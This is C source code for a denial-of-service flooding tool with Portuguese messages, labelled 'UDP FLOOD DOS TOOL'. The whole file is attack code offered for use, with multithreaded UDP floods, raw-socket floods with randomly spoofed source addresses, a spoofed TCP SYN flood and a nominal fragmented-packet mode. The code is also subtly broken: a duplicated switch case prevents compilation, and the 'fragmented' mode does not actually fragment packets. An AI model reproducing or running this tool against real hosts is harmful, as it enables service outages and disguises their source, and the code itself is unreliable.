#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <pthread.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <signal.h>
#include <errno.h>
#include <sys/time.h>

#define MAX_PACKET 65535
#define DEFAULT_THREADS 50
#define DEFAULT_SIZE 1400
#define MAX_THREADS 200

typedef struct {
    char target[64];
    int port;
    int duration;
    int packet_size;
    int thread_id;
    int use_raw;
} attack_args_t;

volatile int attack_running = 1;
volatile unsigned long long packets_sent = 0;
volatile unsigned long long bytes_sent = 0;

unsigned short checksum(unsigned short *buffer, int size) {
    unsigned long sum = 0;
    while (size > 1) {
        sum += *buffer++;
        size -= 2;
    }
    if (size == 1) {
        sum += *(unsigned char *)buffer;
    }
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}

void random_payload(unsigned char *buffer, int size) {
    for (int i = 0; i < size; i++) {
        buffer[i] = rand() & 0xFF;
    }
}

uint32_t random_ip() {
    return (rand() & 0xFF) << 24 |
           (rand() & 0xFF) << 16 |
           (rand() & 0xFF) << 8 |
           (rand() & 0xFF);
}

void *raw_udp_flood(void *arg) {
    attack_args_t *args = (attack_args_t *)arg;
    int sockfd;
    char packet[MAX_PACKET];
    struct sockaddr_in target_addr;
    struct iphdr *ip_header;
    struct udphdr *udp_header;
    unsigned char *payload;
    int packet_size;
    time_t end_time;
    struct timeval tv;

    sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sockfd < 0) {
        printf("[Thread %d] Erro ao criar socket RAW\n", args->thread_id);
        return NULL;
    }

    int one = 1;
    if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        printf("[Thread %d] Erro ao configurar IP_HDRINCL\n", args->thread_id);
        close(sockfd);
        return NULL;
    }

    tv.tv_sec = 0;
    tv.tv_usec = 100;
    setsockopt(sockfd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));

    memset(packet, 0, MAX_PACKET);
    packet_size = sizeof(struct iphdr) + sizeof(struct udphdr) + args->packet_size;

    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(args->port);
    inet_pton(AF_INET, args->target, &target_addr.sin_addr);

    end_time = time(NULL) + args->duration;

    while (attack_running && time(NULL) < end_time) {
        ip_header = (struct iphdr *)packet;
        udp_header = (struct udphdr *)(packet + sizeof(struct iphdr));
        payload = (unsigned char *)(packet + sizeof(struct iphdr) + sizeof(struct udphdr));

        ip_header->ihl = 5;
        ip_header->version = 4;
        ip_header->tos = 0;
        ip_header->tot_len = htons(packet_size);
        ip_header->id = htons(rand() & 0xFFFF);
        ip_header->frag_off = 0;
        ip_header->ttl = 255;
        ip_header->protocol = IPPROTO_UDP;
        ip_header->check = 0;
        ip_header->saddr = random_ip();
        ip_header->daddr = target_addr.sin_addr.s_addr;

        udp_header->source = htons(1024 + (rand() % 64511));
        udp_header->dest = htons(args->port);
        udp_header->len = htons(sizeof(struct udphdr) + args->packet_size);
        udp_header->check = 0;

        random_payload(payload, args->packet_size);
        ip_header->check = checksum((unsigned short *)packet, packet_size);

        if (sendto(sockfd, packet, packet_size, 0,
                   (struct sockaddr *)&target_addr, sizeof(target_addr)) > 0) {
            packets_sent++;
            bytes_sent += packet_size;
        }
    }

    close(sockfd);
    return NULL;
}

void *raw_tcp_flood(void *arg) {
    attack_args_t *args = (attack_args_t *)arg;
    int sockfd;
    char packet[MAX_PACKET];
    struct sockaddr_in target_addr;
    struct iphdr *ip_header;
    struct tcphdr *tcp_header;
    int packet_size;
    time_t end_time;

    sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sockfd < 0) {
        sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
        if (sockfd < 0) {
            printf("[Thread %d] Erro ao criar socket TCP\n", args->thread_id);
            return NULL;
        }
    }

    int one = 1;
    setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));

    memset(packet, 0, MAX_PACKET);
    packet_size = sizeof(struct iphdr) + sizeof(struct tcphdr);

    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(args->port);
    inet_pton(AF_INET, args->target, &target_addr.sin_addr);

    end_time = time(NULL) + args->duration;

    while (attack_running && time(NULL) < end_time) {
        ip_header = (struct iphdr *)packet;
        tcp_header = (struct tcphdr *)(packet + sizeof(struct iphdr));

        ip_header->ihl = 5;
        ip_header->version = 4;
        ip_header->tos = 0;
        ip_header->tot_len = htons(packet_size);
        ip_header->id = htons(rand() & 0xFFFF);
        ip_header->frag_off = 0;
        ip_header->ttl = 255;
        ip_header->protocol = IPPROTO_TCP;
        ip_header->check = 0;
        ip_header->saddr = random_ip();
        ip_header->daddr = target_addr.sin_addr.s_addr;

        tcp_header->source = htons(1024 + (rand() % 64511));
        tcp_header->dest = htons(args->port);
        tcp_header->seq = rand();
        tcp_header->ack_seq = rand();
        tcp_header->doff = 5;
        tcp_header->syn = 1;
        tcp_header->window = htons(65535);
        tcp_header->check = 0;
        tcp_header->urg_ptr = 0;

        ip_header->check = checksum((unsigned short *)packet, packet_size);

        if (sendto(sockfd, packet, packet_size, 0,
                   (struct sockaddr *)&target_addr, sizeof(target_addr)) > 0) {
            packets_sent++;
            bytes_sent += packet_size;
        }
    }

    close(sockfd);
    return NULL;
}

void *udp_flood(void *arg) {
    attack_args_t *args = (attack_args_t *)arg;
    int sockfd;
    struct sockaddr_in target_addr;
    unsigned char *packet;
    time_t end_time;

    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        printf("[Thread %d] Erro ao criar socket UDP\n", args->thread_id);
        return NULL;
    }

    int buffer_size = 1024 * 1024 * 8;
    setsockopt(sockfd, SOL_SOCKET, SO_SNDBUF, &buffer_size, sizeof(buffer_size));

    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(args->port);
    inet_pton(AF_INET, args->target, &target_addr.sin_addr);

    packet = malloc(args->packet_size);
    end_time = time(NULL) + args->duration;

    while (attack_running && time(NULL) < end_time) {
        random_payload(packet, args->packet_size);
        if (sendto(sockfd, packet, args->packet_size, 0,
                   (struct sockaddr *)&target_addr, sizeof(target_addr)) > 0) {
            packets_sent++;
            bytes_sent += args->packet_size;
        }
    }

    free(packet);
    close(sockfd);
    return NULL;
}

void *fragmented_udp_flood(void *arg) {
    attack_args_t *args = (attack_args_t *)arg;
    int sockfd;
    struct sockaddr_in target_addr;
    unsigned char *packet;
    time_t end_time;
    int fragment_size = 512;

    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        return NULL;
    }

    int buffer_size = 1024 * 1024 * 8;
    setsockopt(sockfd, SOL_SOCKET, SO_SNDBUF, &buffer_size, sizeof(buffer_size));

    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(args->port);
    inet_pton(AF_INET, args->target, &target_addr.sin_addr);

    packet = malloc(fragment_size);
    end_time = time(NULL) + args->duration;

    while (attack_running && time(NULL) < end_time) {
        random_payload(packet, fragment_size);
        for (int i = 0; i < 5; i++) {
            packet[0] = i;
            sendto(sockfd, packet, fragment_size, 0,
                   (struct sockaddr *)&target_addr, sizeof(target_addr));
            packets_sent++;
            bytes_sent += fragment_size;
        }
    }

    free(packet);
    close(sockfd);
    return NULL;
}

void print_stats() {
    static time_t last_print = 0;
    static unsigned long long last_packets = 0;
    static unsigned long long last_bytes = 0;
    time_t now = time(NULL);
    
    if (now - last_print >= 1) {
        unsigned long long pps = packets_sent - last_packets;
        unsigned long long bps = bytes_sent - last_bytes;
        double mbps = (bps * 8) / 1000000.0;
        double gbps = mbps / 1000.0;
        
        printf("\r[+] Pacotes: %llu | PPS: %llu | %.2f Mbps | %.3f Gbps     ",
               packets_sent, pps, mbps, gbps);
        fflush(stdout);
        last_print = now;
        last_packets = packets_sent;
        last_bytes = bytes_sent;
    }
}

void *stats_thread(void *arg) {
    while (attack_running) {
        print_stats();
        usleep(100000);
    }
    return NULL;
}

void print_usage(char *program_name) {
    printf("\n=== UDP FLOOD DOS TOOL ===\n\n");
    printf("Uso: %s <IP> <PORTA> <TEMPO> [OPCOES]\n\n", program_name);
    printf("Argumentos obrigatorios:\n");
    printf("  IP       - Endereco IP do alvo\n");
    printf("  PORTA    - Porta de destino\n");
    printf("  TEMPO    - Duracao do ataque em segundos\n\n");
    printf("Opcoes:\n");
    printf("  -t       - Numero de threads (padrao: %d, max: %d)\n", DEFAULT_THREADS, MAX_THREADS);
    printf("  -s       - Tamanho do pacote em bytes (padrao: %d, max: 1472)\n", DEFAULT_SIZE);
    printf("  -r       - Usar raw socket com spoofing (requer root)\n");
    printf("  -tcp     - Usar ataque TCP SYN (requer root)\n");
    printf("  -frag    - Usar pacotes fragmentados (requer root)\n");
    printf("  -h       - Mostrar esta ajuda\n\n");
    printf("Exemplos:\n");
    printf("  %s 192.168.1.1 80 30\n", program_name);
    printf("  sudo %s 192.168.1.1 443 60 -t 50 -s 1400 -r\n", program_name);
    printf("  sudo %s 192.168.1.1 80 30 -tcp -t 30\n", program_name);
    printf("\n");
}

int main(int argc, char *argv[]) {
    char *target;
    int port, duration;
    int num_threads = DEFAULT_THREADS;
    int packet_size = DEFAULT_SIZE;
    int use_raw = 0;
    int use_tcp = 0;
    int use_frag = 0;
    int opt;

    if (argc < 4) {
        print_usage(argv[0]);
        return 1;
    }

    target = argv[1];
    port = atoi(argv[2]);
    duration = atoi(argv[3]);

    optind = 4;
    while ((opt = getopt(argc, argv, "t:s:rtc f h")) != -1) {
        switch (opt) {
            case 't':
                num_threads = atoi(optarg);
                if (num_threads > MAX_THREADS) num_threads = MAX_THREADS;
                if (num_threads < 1) num_threads = 1;
                break;
            case 's':
                packet_size = atoi(optarg);
                if (packet_size > 1472) packet_size = 1472;
                if (packet_size < 64) packet_size = 64;
                break;
            case 'r':
                use_raw = 1;
                break;
            case 't':
                use_tcp = 1;
                break;
            case 'f':
                use_frag = 1;
                break;
            case 'h':
                print_usage(argv[0]);
                return 0;
            default:
                print_usage(argv[0]);
                return 1;
        }
    }

    if (use_raw || use_tcp || use_frag) {
        if (geteuid() != 0) {
            printf("[!] Raw socket requer privilegios de root!\n");
            printf("[!] Execute com sudo\n");
            return 1;
        }
    }

    printf("\n=== INICIANDO ATAQUE ===\n");
    printf("Alvo: %s:%d\n", target, port);
    printf("Duracao: %d segundos\n", duration);
    printf("Threads: %d\n", num_threads);
    printf("Tamanho do pacote: %d bytes\n", packet_size);
    printf("Tipo: ");
    if (use_tcp) printf("TCP SYN Flood (spoofing)\n");
    else if (use_frag) printf("UDP Fragmentado (spoofing)\n");
    else if (use_raw) printf("UDP Raw com spoofing\n");
    else printf("UDP Normal\n");
    printf("==========================\n\n");

    srand(time(NULL) ^ getpid() ^ (unsigned long)pthread_self());
    signal(SIGPIPE, SIG_IGN);

    pthread_t *threads = malloc(num_threads * sizeof(pthread_t));
    attack_args_t *args = malloc(num_threads * sizeof(attack_args_t));

    for (int i = 0; i < num_threads; i++) {
        strncpy(args[i].target, target, sizeof(args[i].target) - 1);
        args[i].port = port;
        args[i].duration = duration;
        args[i].packet_size = packet_size;
        args[i].thread_id = i;
        args[i].use_raw = use_raw;

        if (use_tcp) {
            pthread_create(&threads[i], NULL, raw_tcp_flood, &args[i]);
        } else if (use_frag) {
            pthread_create(&threads[i], NULL, fragmented_udp_flood, &args[i]);
        } else if (use_raw) {
            pthread_create(&threads[i], NULL, raw_udp_flood, &args[i]);
        } else {
            pthread_create(&threads[i], NULL, udp_flood, &args[i]);
        }
    }

    pthread_t stats_thread_id;
    pthread_create(&stats_thread_id, NULL, stats_thread, NULL);

    sleep(duration);
    attack_running = 0;

    for (int i = 0; i < num_threads; i++) {
        pthread_cancel(threads[i]);
        pthread_join(threads[i], NULL);
    }

    pthread_cancel(stats_thread_id);
    pthread_join(stats_thread_id, NULL);

    double total_gb = (bytes_sent * 8) / 1000000000.0;
    double avg_gbps = total_gb / duration;

    printf("\n\n[+] Ataque finalizado!\n");
    printf("[+] Total de pacotes enviados: %llu\n", packets_sent);
    printf("[+] Total de dados enviados: %.2f GB\n", total_gb);
    printf("[+] Media de PPS: %llu\n", packets_sent / duration);
    printf("[+] Media de Gbps: %.3f\n", avg_gbps);

    free(threads);
    free(args);

    return 0;
}
